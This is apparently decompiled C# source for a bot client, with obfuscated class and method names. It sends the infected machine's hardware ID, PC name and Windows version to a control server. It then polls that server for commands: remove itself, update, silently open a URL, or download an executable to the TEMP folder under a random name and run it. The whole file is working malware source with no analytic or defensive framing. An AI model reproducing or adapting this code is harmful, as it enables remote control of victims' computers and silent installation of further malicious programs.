using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace ns0;

internal class Class3
{
	private string string_0 = string.Empty;

	public void method_0()
	{
		method_1();
		Thread thread = new Thread(method_2);
		thread.Start();
	}

	private void method_1()
	{
		string string_ = "mode=0&hwid=" + Class0.class1_0.string_6 + "&botver=" + Class0.class1_0.string_3 + "&pcname=" + Class0.class1_0.string_7 + "&winver=" + Class0.class1_0.string_8;
		while (true)
		{
			try
			{
				string text = method_3(Class0.class1_0.string_2, string_);
				if (text.Length > 0)
				{
					if (text == Class0.class1_0.string_5)
					{
						break;
					}
					Environment.Exit(-1);
				}
			}
			catch
			{
			}
			Thread.Sleep(Class0.class1_0.int_0 * 60 * 1000);
		}
	}

	private void method_2()
	{
		string string_ = "mode=1&hwid=" + Class0.class1_0.string_6;
		while (true)
		{
			try
			{
				string text = method_3(Class0.class1_0.string_2, string_);
				if (text.Length > 0)
				{
					if (text != string_0)
					{
						method_4(text);
						string_0 = text;
					}
				}
				else
				{
					string_0 = string.Empty;
				}
			}
			catch
			{
			}
			Thread.Sleep(Class0.class1_0.int_0 * 60 * 1000);
		}
	}

	private string method_3(string string_1, string string_2)
	{
		ServicePointManager.Expect100Continue = false;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_1);
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		httpWebRequest.Method = "POST";
		httpWebRequest.UserAgent = Class0.class1_0.string_5;
		byte[] bytes = Encoding.ASCII.GetBytes(string_2);
		httpWebRequest.ContentLength = bytes.Length;
		Stream requestStream = httpWebRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = httpWebRequest.GetResponse();
		if (response == null)
		{
			return string.Empty;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}

	private void method_4(string string_1)
	{
		string[] array = new string[0];
		try
		{
			array = string_1.Split(new char[1] { '*' });
		}
		catch
		{
		}
		switch (array[0])
		{
		case "remove":
			if (array[1] == Environment.MachineName || array[1].ToUpper() == "ALL")
			{
				Class0.class2_0.method_4();
			}
			break;
		case "update":
			Class0.class2_0.method_3(Convert.ToString(array[1]));
			break;
		case "visit":
			try
			{
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo(Convert.ToString(array[1]));
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				break;
			}
			catch
			{
				break;
			}
		case "download":
			try
			{
				string text = Class0.class6_0.method_3(new Random().Next(5, 12)) + ".exe";
				new WebClient().DownloadFile(Convert.ToString(array[1]), Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
				Process process = new Process();
				process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
				process.Start();
				break;
			}
			catch
			{
				break;
			}
		}
	}
}
